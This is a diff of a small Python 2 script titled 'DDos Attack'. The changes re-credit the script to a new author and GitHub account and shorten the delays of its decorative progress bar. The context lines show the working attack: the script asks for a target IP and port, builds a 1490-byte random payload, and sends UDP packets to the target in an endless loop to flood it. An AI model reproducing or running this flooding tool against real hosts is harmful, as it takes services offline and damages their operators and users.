@@ -19,8 +19,8 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print "Author   : HA-MRX"
-print "github   : https://github.com/Ha3MrX"
+print "Author   : oscar"
+print "github   : https://github.com/oscarmine"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -28,15 +28,15 @@ port = input("Port       : ")
 os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(2)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(2)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(2)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(2)
 print "[====================] 100%"
-time.sleep(3)
+time.sleep(2)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
